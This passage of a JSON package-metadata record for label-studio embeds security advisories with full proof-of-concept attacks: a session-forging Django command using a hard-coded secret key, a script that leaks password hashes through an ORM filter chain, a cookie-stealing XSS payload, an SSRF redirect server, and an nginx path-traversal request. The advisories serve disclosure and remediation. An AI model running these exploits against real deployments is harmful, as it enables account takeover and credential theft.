password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.4.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.4.1/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","google-api-core (==1.31.5)","google-auth (==1.35.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==1.5.0)","google-cloud-storage (~=1.29.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==0.5.1)","googleapis-common-protos (==1.52.0)","grpc-google-iam-v1 (==0.12.3)","Django (==3.1.14)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.4.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.10.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.3.0)","label-studio-converter (==0.0.39)","label-studio-tools (==0.0.0.dev11)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.4.1","yanked":true,"yanked_reason":"There were some critical bug with a project creation"},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"dfb77a8213ca684d24578b455c4428d262acd5fb265cfafe03cbf7cfa3161bc7","md5":"244ec8f90a1eec863c1235004dc074b5","sha256":"e326931238be6d2ba83d438f6d15a4d70fa104b3089844cb75e5c02f1c5e36f9"},"downloads":-1,"filename":"label_studio-1.4.1-py3-none-any.whl","has_sig":false,"md5_digest":"244ec8f90a1eec863c1235004dc074b5","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":42763974,"upload_time":"2022-02-11T00:56:31","upload_time_iso_8601":"2022-02-11T00:56:31.478429Z","url":"https://files.pythonhosted.org/packages/df/b7/7a8213ca684d24578b455c4428d262acd5fb265cfafe03cbf7cfa3161bc7/label_studio-1.4.1-py3-none-any.whl","yanked":true,"yanked_reason":"There were some critical bug with a project creation"},{"comment_text":"","digests":{"blake2b_256":"1d703a7f7bfb672fd09087cf9edc8e4723a170b3f5208896f8f2bfa07fdede1f","md5":"e5f8db2bbfb70fcbf3655a4bf0d98604","sha256":"c5fa67e31f0a10bd35023da8f5f686efe8d4ac97888da7dcf54c3f23e08fcfa4"},"downloads":-1,"filename":"label-studio-1.4.1.tar.gz","has_sig":false,"md5_digest":"e5f8db2bbfb70fcbf3655a4bf0d98604","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":41963327,"upload_time":"2022-02-11T00:56:55","upload_time_iso_8601":"2022-02-11T00:56:55.125883Z","url":"https://files.pythonhosted.org/packages/1d/70/3a7f7bfb672fd09087cf9edc8e4723a170b3f5208896f8f2bfa07fdede1f/label-studio-1.4.1.tar.gz","yanked":true,"yanked_reason":"There were some critical bug with a project creation"}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', 